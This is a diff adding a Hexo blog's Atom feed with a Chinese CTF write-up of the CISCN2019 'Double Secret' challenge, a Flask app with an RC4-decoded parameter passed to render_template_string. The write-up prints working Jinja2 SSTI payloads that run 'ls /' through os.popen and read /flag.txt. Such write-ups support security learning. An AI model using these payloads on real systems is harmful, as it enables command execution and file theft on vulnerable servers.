@@ -1,0 +1,152 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;rc4&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-06-13T11:56:57.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <category term="willphp2.2" />
+    <category term="ssti-smarty3.1.39" />
+    <category term="./htaccess文件上传" />
+    <category term="php未解析" />
+    <category term="利用环境变量构造bash命令" />
+    <category term="利用.htaccess构成后门" />
+    <category term="通过php_value来设置preg_macth正则回溯次数" />
+    <category term="java反序列化" />
+    <category term="伪随机数" />
+    <category term="mysql" />
+    <category term="信息搜集（js，网络）" />
+    <category term="异或" />
+    <category term="密码爆破" />
+    <category term="sqlmap使用" />
+    <category term="SQL注入" />
+    <category term="文件包含" />
+    <category term="php伪协议" />
+    <category term="pearcmd文件包含" />
+    <category term="xpath注入" />
+    <category term="Padding oracle attack 与CBC翻转字节攻击" />
+    <category term="php" />
+    <category term="sql盲注" />
+    <category term="php7.4" />
+    <category term="FFI预处理" />
+    <category term="thinkphp3.2.4" />
+    <category term="jwt" />
+    <category term="sql二次注入" />
+    <category term="MD5碰撞" />
+    <category term="jwt密码爆破" />
+    <category term="cms" />
+    <category term="create_function()函数" />
+    <category term="sqlע��" />
+    <category term="jwt身份验证" />
+    <category term="rc4" />
+    <entry>
+        <id>http://odiws.github.io/2024/06/13/Secret/</id>
+        <title>’[CISCN2019 华东南赛区]Double Secret‘</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/06/13/Secret/"/>
+        <content type="html">&lt;h2 id=&#34;ciscn2019-华东南赛区double-secret&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019-华东南赛区double-secret&#34;&gt;#&lt;/a&gt; [CISCN2019 华东南赛区] Double Secret&lt;/h2&gt;
+&lt;p&gt;由标题可以知道：有两个 secret；尝试 /secret&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;网页显示是给个参数他就会给你加密（但是却是解密）&lt;/p&gt;
+&lt;p&gt;有两个 secret 可以在参数这里猜:&lt;/p&gt;
+&lt;p&gt;加？secret=12345 发现错误：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现是 ssti 报错：盲猜 jinja2：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1hcHAtODU1Zi5weQ==&#34;&gt;找 app.py&lt;/span&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-pyhton&#34;&gt; if(secret==None):
+        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;
+    rc=rc4_Modified.RC4(&amp;quot;HereIsTreasure&amp;quot;)   #解密
+    deS=rc.do_crypt(secret)
+ 
+    a=render_template_string(safe(deS))
+ 
+    if &#39;ciscn&#39; in a.lower():
+        return &#39;flag detected!&#39;  
+    return a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以发现是加了一个 rc4 的解密，密钥为：HereIsTreasure&lt;/p&gt;
+&lt;p&gt;我直接搞个加密 rc4 的密钥一样就可以了：&lt;/p&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;读 flag.txt  payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/flag.txt&#39;).read()&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;但是要加一个 url 加密，在加一个加密所有字符（因为好像直接输入会丢字符）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="flask" />
+        <category term="ssti" />
+        <category term="rc4" />
+        <updated>2024-06-13T11:56:57.000Z</updated>
+    </entry>
+</feed>
